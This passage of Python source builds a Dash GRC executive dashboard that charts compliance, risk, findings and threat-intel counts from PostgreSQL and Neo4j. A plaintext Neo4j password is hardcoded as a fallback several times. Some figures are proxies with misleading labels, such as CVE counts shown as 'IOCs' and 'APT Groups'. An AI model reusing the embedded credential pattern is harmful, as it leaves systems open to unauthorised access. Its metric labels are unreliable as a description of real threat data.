"""
ui_grc_executive.py
====================
Unified GRC Executive Dashboard

Shows:
  - Enterprise risk score (gauge)
  - Compliance trends (line chart)
  - Attack surface overview (host/vuln breakdown)
  - POA&M status (bar chart)
  - Risk heatmap (5x5 matrix)
  - Threat intel summary
  - Certification status

Layout: layout_grc_executive()
"""
from __future__ import annotations

import json
from datetime import datetime

import dash
from dash import callback, dcc, html, Input, Output, State, ctx
from dash.exceptions import PreventUpdate
import dash_bootstrap_components as dbc
import plotly.graph_objects as go

# ── Style tokens ──────────────────────────────────────────────────
DARK_BG   = "#0d0d0d"
CARD_BG   = "#111317"
BORDER    = "1px solid #1e2230"
ACCENT    = "#00d4ff"
ACCENT2   = "#7c3aed"
GREEN     = "#27ae60"
RED       = "#e74c3c"
ORANGE    = "#f39c12"
YELLOW    = "#f1c40f"


def _metric_card(title: str, value, subtitle: str = "", color: str = ACCENT,
                 icon: str = "📊", card_id: str = "", sub_id: str = "") -> dbc.Col:
    """Premium metric card component."""
    sub_props = {"style": {"fontSize": "11px", "color": "#666", "marginTop": "4px"}}
    if sub_id:
        sub_props["id"] = sub_id
    return dbc.Col(html.Div([
        html.Div([
            html.Span(icon, style={"fontSize": "22px"}),
            html.Div(title, style={
                "fontSize": "10px", "fontWeight": "700", "color": "#8e9eb0",
                "textTransform": "uppercase", "letterSpacing": "0.8px",
            }),
        ], style={"display": "flex", "alignItems": "center", "gap": "8px", "marginBottom": "8px"}),
        html.Div(str(value), id=card_id if card_id else f"grc-metric-{title.lower().replace(' ', '-')}",
                 style={
            "fontSize": "28px", "fontWeight": "800", "color": color,
            "lineHeight": "1",
        }),
        html.Div(subtitle, **sub_props) if subtitle else html.Div(),
    ], style={
        "background": CARD_BG, "borderRadius": "12px", "padding": "16px",
        "border": BORDER, "height": "100%",
        "boxShadow": "0 2px 12px rgba(0,0,0,0.3)",
    }), width=3, className="mb-3")


def _section_header(title: str, icon: str = "") -> html.Div:
    return html.Div([
        html.Span(f"{icon} {title}", style={
            "fontSize": "14px", "fontWeight": "700", "color": "#fff",
            "textTransform": "uppercase", "letterSpacing": "1px",
        }),
        html.Hr(style={"borderColor": "#1e2230", "margin": "8px 0"}),
    ], style={"marginTop": "20px", "marginBottom": "12px"})


def layout_grc_executive() -> html.Div:
    """Build the GRC Executive Dashboard."""
    return html.Div([
        # ── Header ──────────────────────────────────────────────
        html.Div([
            html.Div([
                html.Span("🏛️ ", style={"fontSize": "30px"}),
                html.Div([
                    html.Span("GRC Executive Dashboard",
                              style={"fontSize": "22px", "fontWeight": "800", "color": "#fff"}),
                    html.Div("Enterprise Risk · Compliance Trends · Attack Surface · Threat Intel",
                             style={"fontSize": "11px", "color": "#8e9eb0"}),
                ]),
            ], style={"display": "flex", "alignItems": "center", "gap": "10px"}),
            html.Div([
                dbc.Button([html.I(className="fas fa-clipboard-check me-1"), "Compliance"],
                           id="menu-compliance-0", size="sm", outline=True, color="warning",
                           style={"borderRadius": "8px", "fontSize": "12px"}),
                dbc.Button([html.I(className="fas fa-robot me-1"), "AI Assistant"],
                           id="menu-compliance-ai-0", size="sm", outline=True, color="success",
                           style={"borderRadius": "8px", "fontSize": "12px"}),
                dbc.Button([html.I(className="fas fa-sync me-1"), "Refresh"],
                           id="grc-exec-refresh", size="sm", outline=True, color="info",
                           style={"borderRadius": "8px", "fontSize": "12px"}),
            ], style={"display": "flex", "gap": "8px"}),
        ], style={
            "display": "flex", "justifyContent": "space-between", "alignItems": "center",
            "background": f"linear-gradient(135deg, {CARD_BG}, #151820)",
            "padding": "16px 20px", "borderRadius": "12px",
            "borderBottom": f"2px solid {ACCENT}", "marginBottom": "16px",
        }),

        # ── Top Metrics Row ─────────────────────────────────────
        dbc.Row(id="grc-exec-metrics", children=[
            _metric_card("Compliance Score", "—%", "Loading...", GREEN, "📋", "grc-exec-score", "grc-exec-score-sub"),
            _metric_card("Open Findings", "—", "Loading...", RED, "🔓", "grc-exec-findings", "grc-exec-findings-sub"),
            _metric_card("Open POA&Ms", "—", "Loading...", ORANGE, "📝", "grc-exec-poams", "grc-exec-poams-sub"),
            _metric_card("Risk Items", "—", "Loading...", ACCENT2, "⚠️", "grc-exec-risks", "grc-exec-risks-sub"),
        ]),

        # ── Row 2: Compliance Gauge + Trends ────────────────────
        dbc.Row([
            dbc.Col([
                html.Div([
                    _section_header("Compliance Score", "🎯"),
                    html.Div(
                        dcc.Graph(id="grc-exec-gauge", config={"displayModeBar": False},
                                  style={"height": "260px"}),
                        id="grc-gauge-click", n_clicks=0,
                        style={"cursor": "pointer"},
                    ),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=4),
            dbc.Col([
                html.Div([
                    _section_header("Compliance Trends", "📈"),
                    dcc.Graph(id="grc-exec-trends", config={"displayModeBar": False},
                              style={"height": "260px"}),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=8),
        ], className="mb-3"),

        # ── Row 3: Risk Heatmap + POA&M Breakdown ───────────────
        dbc.Row([
            dbc.Col([
                html.Div([
                    _section_header("Risk Heatmap", "🔥"),
                    dcc.Graph(id="grc-exec-heatmap", config={"displayModeBar": False},
                              style={"height": "280px"}),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=5),
            dbc.Col([
                html.Div([
                    _section_header("Findings by Severity", "📊"),
                    dcc.Graph(id="grc-exec-severity", config={"displayModeBar": False},
                              style={"height": "280px"}),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=4),
            dbc.Col([
                html.Div([
                    _section_header("Certifications", "🏅"),
                    html.Div(id="grc-exec-certs", children=[
                        _cert_badge("FedRAMP Moderate", "In Progress", ORANGE),
                        _cert_badge("SOC 2 Type II", "Planned", "#8e9eb0"),
                        _cert_badge("ISO 27001", "Planned", "#8e9eb0"),
                        _cert_badge("NIST 800-53", "Active", GREEN),
                    ]),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER, "height": "100%"}),
            ], width=3),
        ], className="mb-3"),

        # ── Row 4: Attack Surface + Threat Intel ────────────────
        dbc.Row([
            dbc.Col([
                html.Div([
                    _section_header("Attack Surface", "🎯"),
                    html.Div(id="grc-exec-attack-surface"),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=6),
            dbc.Col([
                html.Div([
                    _section_header("Threat Intelligence", "🛡️"),
                    html.Div(id="grc-exec-threat-intel"),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=6),
        ], className="mb-3"),

        # ── Row 5: Scanner Summary + Exploit Intelligence ────────
        dbc.Row([
            dbc.Col([
                html.Div([
                    _section_header("Scanner Intelligence Summary", "🔬"),
                    html.Div(id="grc-exec-scanner-summary"),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=6),
            dbc.Col([
                html.Div([
                    _section_header("Exploit Intelligence", "💣"),
                    html.Div(id="grc-exec-exploit-intel"),
                ], style={"background": CARD_BG, "borderRadius": "12px", "padding": "16px",
                          "border": BORDER}),
            ], width=6),
        ], className="mb-3"),

        # ── Drill-Down Modal ──────────────────────────────────────
        dbc.Modal([
            dbc.ModalHeader(
                dbc.ModalTitle("", id="grc-drill-title"),
                close_button=True,
                style={"background": "#0d1117", "borderBottom": f"2px solid {ACCENT}"},
            ),
            dbc.ModalBody(
                html.Div(id="grc-drill-body"),
                style={"background": "#0d1117", "maxHeight": "70vh", "overflowY": "auto"},
            ),
        ], id="grc-drill-modal", size="xl", centered=True, is_open=False,
           style={"color": "#e0e0e0"}),
        # ── Hosts Drill-Down Modal ─────────────────────────────────
        dbc.Modal([
            dbc.ModalHeader(
                dbc.ModalTitle("🖥️ All Hosts — Attack Surface", id="grc-hosts-title"),
                close_button=True,
                style={"background": "#0d1117", "borderBottom": f"2px solid {ACCENT}"},
            ),
            dbc.ModalBody(
                html.Div(id="grc-hosts-body"),
                style={"background": "#0d1117", "maxHeight": "75vh", "overflowY": "auto"},
            ),
        ], id="grc-hosts-modal", size="xl", centered=True, is_open=False,
           style={"color": "#e0e0e0"}),

        # ── Host Detail Modal (per-host services/findings/vulns) ──
        dbc.Modal([
            dbc.ModalHeader(
                dbc.ModalTitle("", id="grc-hostdetail-title"),
                close_button=True,
                style={"background": "#0d1117", "borderBottom": f"2px solid #00d4ff"},
            ),
            dbc.ModalBody(
                html.Div(id="grc-hostdetail-body"),
                style={"background": "#0d1117", "maxHeight": "75vh", "overflowY": "auto"},
            ),
        ], id="grc-hostdetail-modal", size="xl", centered=True, is_open=False,
           style={"color": "#e0e0e0"}),

        # Auto-refresh interval
        dcc.Interval(id="grc-exec-interval", interval=300_000, n_intervals=0),  # 5 min
    ], style={"padding": "8px"})


def _cert_badge(name: str, status: str, color: str) -> html.Div:
    return html.Div([
        html.Div([
            html.Span("●", style={"color": color, "fontSize": "12px"}),
            html.Span(name, style={"fontSize": "12px", "fontWeight": "600", "color": "#e0e0e0"}),
        ], style={"display": "flex", "alignItems": "center", "gap": "6px"}),
        html.Span(status, style={
            "fontSize": "10px", "color": color, "fontWeight": "600",
            "background": f"{color}22", "padding": "2px 8px", "borderRadius": "10px",
        }),
    ], style={
        "display": "flex", "justifyContent": "space-between", "alignItems": "center",
        "padding": "8px 0", "borderBottom": BORDER,
    })


# ── Callbacks ────────────────────────────────────────────────────

@callback(
    Output("grc-exec-score", "children"),
    Output("grc-exec-findings", "children"),
    Output("grc-exec-poams", "children"),
    Output("grc-exec-risks", "children"),
    Output("grc-exec-score-sub", "children"),
    Output("grc-exec-findings-sub", "children"),
    Output("grc-exec-poams-sub", "children"),
    Output("grc-exec-risks-sub", "children"),
    Output("grc-exec-gauge", "figure"),
    Output("grc-exec-trends", "figure"),
    Output("grc-exec-heatmap", "figure"),
    Output("grc-exec-severity", "figure"),
    Output("grc-exec-attack-surface", "children"),
    Output("grc-exec-threat-intel", "children"),
    Output("grc-exec-scanner-summary", "children"),
    Output("grc-exec-exploit-intel", "children"),
    Output("grc-exec-certs", "children"),
    Input("grc-exec-refresh", "n_clicks"),
    Input("grc-exec-interval", "n_intervals"),
)
def _refresh_executive_dashboard(n_clicks, n_intervals):
    """Populate the executive dashboard with live data."""
    # ── Fetch data ──────────────────────────────────────────────
    score = 0
    open_findings = 0
    open_poams = 0
    risk_count = 0
    history = []
    sev_data = {}
    assets = []

    try:
        from cyber_range.services.pg_engine import pg_execute, _PG_AVAILABLE
        if _PG_AVAILABLE:
            # Compliance score
            sc = pg_execute("""
                SELECT count(*) AS total,
                       count(*) FILTER (WHERE status='Implemented') AS impl,
                       count(*) FILTER (WHERE status='Partially Implemented') AS partial,
                       count(*) FILTER (WHERE status='N/A') AS na
                FROM system_controls WHERE system_id = 1
            """)
            if sc and sc[0]["total"]:
                d = max((sc[0]["total"] or 1) - (sc[0].get("na") or 0), 1)
                score = round(((sc[0]["impl"] or 0) + 0.5 * (sc[0]["partial"] or 0)) / d * 100, 1)

            # Open findings
            vr = pg_execute("SELECT count(*) AS n FROM grc_vulnerabilities WHERE status='Open'")
            open_findings = vr[0]["n"] if vr else 0

            # Severity breakdown
            sr = pg_execute("""
                SELECT severity, count(*) AS cnt FROM grc_vulnerabilities
                WHERE status='Open' GROUP BY severity
            """)
            for r in sr:
                sev_data[r["severity"]] = r["cnt"]

            # POA&Ms
            pr = pg_execute("SELECT count(*) AS n FROM poam WHERE status != 'Closed'")
            open_poams = pr[0]["n"] if pr else 0

            # Risks
            rr = pg_execute("SELECT count(*) AS n FROM risks WHERE status != 'Closed'")
            risk_count = rr[0]["n"] if rr else 0

            # History
            hr = pg_execute("""
                SELECT score, recorded_at FROM compliance_scores
                WHERE system_id = 1 ORDER BY recorded_at DESC LIMIT 12
            """)
            history = list(reversed(hr)) if hr else []
    except Exception:
        pass

    # Fallback: get from Neo4j scan findings when PostgreSQL is empty
    if not open_findings:
        try:
            import os as _os2
            from neo4j import GraphDatabase
            from datetime import timedelta
            pw = _os2.environ.get("NEO4J_PASSWORD", "Adomaa12@")
            driver = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", pw))
            with driver.session() as s:
                # Total findings
                r = s.run("MATCH (f:Finding) RETURN count(f) AS n").single()
                open_findings = r["n"] if r else 0

                # Host/service counts for attack surface
                a = s.run("MATCH (h:Host) RETURN count(h) AS n").single()
                host_count = a["n"] if a else 0
                sv = s.run("""
                    MATCH (h:Host)-[:RUNS_SERVICE]->(s:Service)
                    RETURN count(DISTINCT s) AS services
                """).single()
                svc_count = sv["services"] if sv else 0
                assets = [{"hosts": host_count, "services": svc_count}]

                # Severity breakdown for findings
                sr2 = s.run("""
                    MATCH (f:Finding)
                    RETURN coalesce(toString(f.severity), 'Medium') AS severity,
                           count(f) AS cnt
                """).data()
                for r2 in sr2:
                    sev_key = str(r2["severity"]).capitalize()
                    if sev_key in ("3", "3.0"): sev_key = "High"
                    elif sev_key in ("2", "2.0"): sev_key = "Medium"
                    elif sev_key in ("1", "1.0"): sev_key = "Low"
                    elif sev_key in ("0", "0.0"): sev_key = "Info"
                    sev_data[sev_key] = sev_data.get(sev_key, 0) + r2["cnt"]

                # Derive compliance score from severity distribution
                # Logic: lower severity = higher compliance
                total = sum(sev_data.values()) or 1
                crit = sev_data.get("Critical", 0)
                high = sev_data.get("High", 0)
                med  = sev_data.get("Medium", 0)
                low  = sev_data.get("Low", 0)
                info = sev_data.get("Info", sev_data.get("Information", 0))
                # Weighted: crit=0pts, high=20pts, med=50pts, low=80pts, info=100pts
                weighted = (crit * 0 + high * 20 + med * 50 + low * 80 + info * 100)
                score = round(weighted / (total * 100) * 100, 1) if total else 0

                # POA&Ms = Critical + High findings (need remediation action)
                open_poams = crit + high

                # Risk items = number of distinct scanner sources with findings
                risk_r = s.run("""
                    MATCH (f:Finding)
                    WHERE toLower(toString(coalesce(f.severity,''))) IN ['critical','high']
                    RETURN count(DISTINCT coalesce(f.cve, f.name)) AS n
                """).single()
                risk_count = risk_r["n"] if risk_r else 0

                # Compliance trends — build from finding timestamps
                trend_data = s.run("""
                    MATCH (f:Finding)
                    WHERE f.last_seen IS NOT NULL
                    WITH date(datetime(f.last_seen)) AS d, count(f) AS cnt
                    RETURN toString(d) AS day, cnt
                    ORDER BY d DESC LIMIT 14
                """).data()
                if trend_data:
                    # Convert to compliance-like scores over time
                    max_findings = max(t["cnt"] for t in trend_data) or 1
                    history = []
                    for t in reversed(trend_data):
                        # Fewer findings on a day = higher score
                        day_score = max(0, round(100 - (t["cnt"] / max_findings * 60), 1))
                        history.append({"recorded_at": t["day"], "score": day_score})
                    if not history:
                        history = [{"recorded_at": "Today", "score": score}]
                else:
                    history = [{"recorded_at": "Today", "score": score}]

            driver.close()
        except Exception as _e:
            import traceback
            traceback.print_exc()

    # ── Build gauge chart ─────────────────────────────────────
    gauge_color = GREEN if score >= 80 else (ORANGE if score >= 50 else RED)
    gauge_fig = go.Figure(go.Indicator(
        mode="gauge+number",
        value=score,
        number={"suffix": "%", "font": {"size": 36, "color": "#fff"}},
        gauge={
            "axis": {"range": [0, 100], "tickfont": {"color": "#555"}, "dtick": 20},
            "bar": {"color": gauge_color, "thickness": 0.7},
            "bgcolor": "#1a1d24",
            "borderwidth": 0,
            "steps": [
                {"range": [0, 30], "color": "#3d1111"},
                {"range": [30, 60], "color": "#3d3011"},
                {"range": [60, 80], "color": "#1a3d11"},
                {"range": [80, 100], "color": "#113d1f"},
            ],
        },
    ))
    gauge_fig.update_layout(
        paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
        margin=dict(l=20, r=20, t=30, b=10), height=240,
    )

    # ── Build trends chart ────────────────────────────────────
    if history:
        dates = [str(h.get("recorded_at", ""))[:10] for h in history]
        scores = [h.get("score", 0) for h in history]
    else:
        dates = ["Today"]
        scores = [score]

    trends_fig = go.Figure()
    trends_fig.add_trace(go.Scatter(
        x=dates, y=scores, mode="lines+markers",
        line=dict(color=ACCENT, width=3),
        marker=dict(size=8, color=ACCENT),
        fill="tozeroy", fillcolor="rgba(0,212,255,0.1)",
        name="Compliance Score",
    ))
    trends_fig.update_layout(
        paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
        margin=dict(l=40, r=20, t=10, b=30), height=240,
        xaxis=dict(gridcolor="#1e2230", color="#555"),
        yaxis=dict(gridcolor="#1e2230", color="#555", range=[0, 100]),
        showlegend=False,
    )

    # ── Build heatmap ─────────────────────────────────────────
    heatmap_data = [[0]*5 for _ in range(5)]
    heatmap_hosts = [[[] for _ in range(5)] for _ in range(5)]  # host IPs per cell
    pg_has_risks = False

    # Try PostgreSQL first
    try:
        from cyber_range.services.pg_engine import pg_execute, _PG_AVAILABLE
        if _PG_AVAILABLE:
            hm = pg_execute("""
                SELECT likelihood, impact, count(*) AS cnt FROM risks
                WHERE status != 'Closed' GROUP BY likelihood, impact
            """)
            if hm:
                pg_has_risks = True
                for r in hm:
                    li = min(int(r.get("likelihood", 1)) - 1, 4)
                    im = min(int(r.get("impact", 1)) - 1, 4)
                    heatmap_data[li][im] = r["cnt"]
    except Exception:
        pass

    # Neo4j fallback: derive likelihood × impact from findings
    if not pg_has_risks:
        try:
            import os as _os_hm
            from neo4j import GraphDatabase
            _pw_hm = _os_hm.environ.get("NEO4J_PASSWORD", "Adomaa12@")
            _d_hm = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw_hm))
            with _d_hm.session() as _s_hm:
                # Get findings with severity, exploitability, EPSS, CVSS, and host IP
                risk_data = _s_hm.run("""
                    MATCH (h:Host)-[:RUNS_SERVICE|EXPOSES|HasService]->(:Service)
                          -[:HAS_FINDING|HAS_VULN]->(f:Finding)
                    OPTIONAL MATCH (v:Vulnerability {cve: f.cve})
                    OPTIONAL MATCH (c:CVE {id: f.cve})
                    WITH f,
                         coalesce(h.host, h.ip, 'unknown') AS host_ip,
                         coalesce(v.cvss, f.cvss) AS cvss,
                         toLower(toString(coalesce(f.severity, 'info'))) AS sev,
                         coalesce(v.exploitable, f.exploitable, false) AS exploitable,
                         coalesce(c.epss, 0.0) AS epss
                    RETURN host_ip, sev, cvss, exploitable, epss
                """).data()

                for r in risk_data:
                    cvss = float(r["cvss"]) if r["cvss"] is not None else None
                    sev = r["sev"]
                    exploitable = r["exploitable"]
                    epss = float(r["epss"]) if r["epss"] else 0
                    host = r["host_ip"]

                    # Impact (0-4) from severity/CVSS
                    if cvss is not None:
                        if cvss >= 9.0:   impact = 4  # Very High
                        elif cvss >= 7.0: impact = 3  # High
                        elif cvss >= 4.0: impact = 2  # Medium
                        elif cvss >= 0.1: impact = 1  # Low
                        else:             impact = 0  # Very Low
                    else:
                        impact = {"critical": 4, "high": 3, "medium": 2, "low": 1}.get(sev, 0)

                    # Likelihood (0-4) from exploitability + EPSS
                    if exploitable and epss >= 0.5:
                        likelihood = 4  # Very High
                    elif exploitable or epss >= 0.3:
                        likelihood = 3  # High
                    elif epss >= 0.1:
                        likelihood = 2  # Medium
                    elif epss > 0 or sev in ("high", "critical"):
                        likelihood = 1  # Low
                    else:
                        likelihood = 0  # Very Low

                    heatmap_data[likelihood][impact] += 1
                    if host and host not in heatmap_hosts[likelihood][impact]:
                        heatmap_hosts[likelihood][impact].append(host)

            _d_hm.close()
        except Exception:
            import traceback
            traceback.print_exc()

    hm_max = max(max(row) for row in heatmap_data) or 1
    level_names = ["Very Low", "Low", "Medium", "High", "Very High"]

    # Build hover text with host IPs
    hover_text = []
    for li in range(5):
        row_hover = []
        for im in range(5):
            cnt = heatmap_data[li][im]
            hosts = heatmap_hosts[li][im][:8]  # limit display
            extra = len(heatmap_hosts[li][im]) - 8
            if cnt:
                lines = [f"<b>{cnt} findings</b>",
                         f"Likelihood: {level_names[li]}",
                         f"Impact: {level_names[im]}"]
                if hosts:
                    lines.append(f"<b>Hosts:</b> {', '.join(hosts)}")
                    if extra > 0:
                        lines.append(f"  +{extra} more")
                row_hover.append("<br>".join(lines))
            else:
                row_hover.append(f"Likelihood: {level_names[li]}<br>Impact: {level_names[im]}<br>No findings")
        hover_text.append(row_hover)

    heatmap_fig = go.Figure(go.Heatmap(
        z=heatmap_data,
        x=level_names,
        y=level_names,
        zmin=0, zmax=hm_max,
        colorscale=[[0, "#111317"], [0.01, "#162a16"], [0.25, "#1a3d11"],
                    [0.5, "#f1c40f"], [0.75, "#f39c12"], [1, "#e74c3c"]],
        showscale=False,
        text=[[str(c) if c else "—" for c in row] for row in heatmap_data],
        texttemplate="%{text}",
        textfont={"size": 14, "color": "#fff"},
        hovertext=hover_text,
        hoverinfo="text",
    ))
    heatmap_fig.update_layout(
        paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
        margin=dict(l=60, r=20, t=10, b=40), height=260,
        xaxis=dict(title="Impact →", color="#555", side="bottom"),
        yaxis=dict(title="Likelihood →", color="#555"),
    )

    # ── Build severity chart ──────────────────────────────────
    sev_labels = ["Critical", "High", "Medium", "Low"]
    # Fallback to Neo4j if PostgreSQL has no severity data
    if not any(sev_data.values()):
        try:
            import os as _os2
            from neo4j import GraphDatabase
            pw2 = _os2.environ.get("NEO4J_PASSWORD", "Adomaa12@")
            d2 = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", pw2))
            with d2.session() as s2:
                sr2 = s2.run("""
                    MATCH (f:Finding)
                    OPTIONAL MATCH (v:Vulnerability {cve: f.cve})
                    WITH CASE
                      WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                           AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 9.0 THEN 'Critical'
                      WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                           AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 7.0 THEN 'High'
                      WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                           AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 4.0 THEN 'Medium'
                      WHEN coalesce(v.cvss, f.cvss) IS NOT NULL
                           AND toFloat(toString(coalesce(v.cvss, f.cvss))) >= 0.1 THEN 'Low'
                      WHEN toLower(toString(coalesce(f.severity, ''))) IN
                           ['critical','high','medium','low'] THEN
                           CASE toLower(toString(f.severity))
                             WHEN 'critical' THEN 'Critical'
                             WHEN 'high' THEN 'High'
                             WHEN 'medium' THEN 'Medium'
                             WHEN 'low' THEN 'Low'
                           END
                      ELSE 'Info'
                    END AS sev
                    RETURN sev AS severity, count(*) AS cnt
                """).data()
                for r2 in sr2:
                    sev_data[r2["severity"]] = r2["cnt"]
            d2.close()
        except Exception:
            pass

    sev_values = [sev_data.get(s, 0) for s in sev_labels]
    sev_colors = [RED, ORANGE, YELLOW, GREEN]

    severity_fig = go.Figure(go.Bar(
        x=sev_labels, y=sev_values,
        marker_color=sev_colors,
        text=sev_values, textposition="auto",
        textfont=dict(color="#fff", size=14),
    ))
    severity_fig.update_layout(
        paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
        margin=dict(l=30, r=10, t=10, b=30), height=260,
        xaxis=dict(color="#555"),
        yaxis=dict(color="#555", gridcolor="#1e2230", type="log"),
    )

    # ── Attack surface summary ────────────────────────────────
    try:
        import os as _os
        from neo4j import GraphDatabase
        pw = _os.environ.get("NEO4J_PASSWORD", "Adomaa12@")
        driver = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", pw))
        with driver.session() as s:
            counts = s.run("""
                MATCH (h:Host) WITH count(h) AS hosts
                MATCH (s:Service) WITH hosts, count(s) AS services
                MATCH (f:Finding) WITH hosts, services, count(f) AS findings
                MATCH (v:Vulnerability) RETURN hosts, services, findings, count(v) AS vulns
            """).single()
        driver.close()
        h = counts["hosts"] if counts else 0
        sv = counts["services"] if counts else 0
        fi = counts["findings"] if counts else 0
        vl = counts["vulns"] if counts else 0
    except Exception:
        h, sv, fi, vl = 0, 0, 0, 0

    attack_surface = html.Div([
        dbc.Row([
            dbc.Col(_mini_stat("🖥️ Hosts", h), width=3),
            dbc.Col(_mini_stat("⚙️ Services", sv), width=3),
            dbc.Col(_mini_stat("🔍 Findings", fi), width=3),
            dbc.Col(_mini_stat("🔓 Vulns", vl), width=3),
        ]),
        html.Div([
            html.Div("Attack Surface Coverage",
                     style={"fontSize": "11px", "color": "#8e9eb0", "marginTop": "12px"}),
            html.Div(
                dbc.Progress([
                    dbc.Progress(value=min(h * 5, 100), color="info", bar=True, label="Hosts"),
                    dbc.Progress(value=min(sv * 2, 100), color="warning", bar=True),
                ], style={"height": "20px", "background": "#1a1d24", "borderRadius": "10px"}),
                id="grc-hosts-bar",
                n_clicks=0,
                style={"cursor": "pointer"},
            ),
        ]),
    ])

    # ── Threat intel summary ──────────────────────────────────
    try:
        from cyber_range.services.threat_intel_engine import ThreatIntelEngine
        tl = ThreatIntelEngine()
        landscape = tl.get_threat_landscape()
        ioc_total = landscape.get("ioc_stats", {}).get("total_iocs", 0)
        events = landscape.get("recent_events", [])
        adversaries = landscape.get("adversaries", [])
    except Exception:
        ioc_total, events, adversaries = 0, [], []

    # Neo4j fallback for threat intel
    if not ioc_total:
        try:
            import os as _os3
            from neo4j import GraphDatabase
            _pw3 = _os3.environ.get("NEO4J_PASSWORD", "Adomaa12@")
            _d3 = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw3))
            with _d3.session() as _s3:
                # IOCs = distinct CVEs found
                _ioc = _s3.run("""
                    MATCH (f:Finding)
                    WHERE f.cve IS NOT NULL AND f.cve <> ''
                    RETURN count(DISTINCT f.cve) AS n
                """).single()
                ioc_total = _ioc["n"] if _ioc else 0

                # Events = distinct scanner sources that produced findings
                _ev = _s3.run("""
                    MATCH (f:Finding)
                    RETURN count(DISTINCT coalesce(toString(f.source), 'unknown')) AS n
                """).single()
                events = list(range(_ev["n"])) if _ev else []

                # APT Groups = KEV-matching CVEs (critical threats)
                _kev = _s3.run("""
                    MATCH (f:Finding)
                    WHERE f.in_kev = true
                    RETURN count(DISTINCT f.cve) AS n
                """).single()
                adversaries = list(range(_kev["n"])) if _kev else []
            _d3.close()
        except Exception:
            pass

    threat_summary = html.Div([
        dbc.Row([
            dbc.Col(_mini_stat("🎯 IOCs", ioc_total), width=4),
            dbc.Col(_mini_stat("📡 Events", len(events)), width=4),
            dbc.Col(_mini_stat("👤 APT Groups", len(adversaries)), width=4),
        ]),
        html.Div([
            html.Div("Active Feeds", style={"fontSize": "11px", "color": "#8e9eb0", "marginTop": "12px"}),
            html.Div([
                _feed_status("CISA KEV", True),
                _feed_status("Feodo C2", True),
                _feed_status("URLhaus", True),
            ], style={"display": "flex", "gap": "8px", "marginTop": "6px"}),
        ]),
    ])

    # ── Scanner Intelligence Summary ──────────────────────────
    scanner_rows = []
    try:
        import os as _os4
        from neo4j import GraphDatabase
        _pw4 = _os4.environ.get("NEO4J_PASSWORD", "Adomaa12@")
        _d4 = GraphDatabase.driver("bolt://127.0.0.1:7687", auth=("neo4j", _pw4))
        with _d4.session() as _s4:
            _sr = _s4.run("""
                MATCH (f:Finding)
                WITH coalesce(toString(f.source), 'unknown') AS src, f,
                     CASE
                       WHEN f.severity IS NULL THEN 'info'
                       WHEN toLower(toString(f.severity)) IN ['critical'] THEN 'critical'
                       WHEN toLower(toString(f.severity)) IN ['high'] THEN 'high'
                       WHEN toLower(toString(f.severity)) IN ['medium'] THEN 'medium'
                       WHEN toLower(toString(f.severity)) IN ['low'] THEN 'low'
                       WHEN toLower(toString(f.severity)) IN ['info','information','informational'] THEN 'info'
                       WHEN toFloat(toString(f.severity)) >= 9.0 THEN 'critical'
                       WHEN toFloat(toString(f.severity)) >= 7.0 THEN 'high'
                       WHEN toFloat(toString(f.severity)) >= 4.0 THEN 'medium'
                       WHEN toFloat(toString(f.severity)) >= 0.1 THEN 'low'
                       ELSE 'info'
                     END AS sev_bucket
                RETURN src,
                  sum(CASE WHEN sev_bucket = 'critical' THEN 1 ELSE 0 END) AS critical,
                  sum(CASE WHEN sev_bucket = 'high'     THEN 1 ELSE 0 END) AS high,
                  sum(CASE WHEN sev_bucket = 'medium'   THEN 1 ELSE 0 END) AS medium,
                  sum(CASE WHEN sev_bucket = 'low'      THEN 1 ELSE 0 END) AS low,
                  sum(CASE WHEN sev_bucket = 'info'     THEN 1 ELSE 0 END) AS info,
                  count(f) AS total
                ORDER BY total DESC
            """).data()
            scanner_rows = _sr
        _d4.close()
    except Exception:
        pass

    SEV_COLORS = {"critical": RED, "high": ORANGE, "medium": YELLOW, "low": GREEN}

    def _sev_pill(val, color):
        return html.Span(str(val), style={
            "background": f"{color}22", "color": color, "padding": "2px 10px",
            "borderRadius": "12px", "fontWeight": "700", "fontSize": "12px",
            "minWidth": "32px", "display": "inline-block", "textAlign": "center",
        })

    scanner_table_rows = []
    for sr in scanner_rows:
        scanner_table_rows.append(html.Tr([
            html.Td(html.Span(sr["src"], style={"fontWeight": "700", "color": "#e0e0e0", "fontSize": "12px"})),
            html.Td(_sev_pill(sr["critical"], RED), style={"textAlign": "center"}),
            html.Td(_sev_pill(sr["high"], ORANGE), style={"textAlign": "center"}),
            html.Td(_sev_pill(sr["medium"], YELLOW), style={"textAlign": "center"}),
            html.Td(_sev_pill(sr["low"], GREEN), style={"textAlign": "center"}),
            html.Td(_sev_pill(sr.get("info", 0), "#8e9eb0"), style={"textAlign": "center"}),
            html.Td(html.Span(str(sr["total"]), style={
                "fontWeight": "800", "color": ACCENT, "fontSize": "13px",
            }), style={"textAlign": "center"}),
        ], style={"borderBottom": "1px solid #1e2230"}))

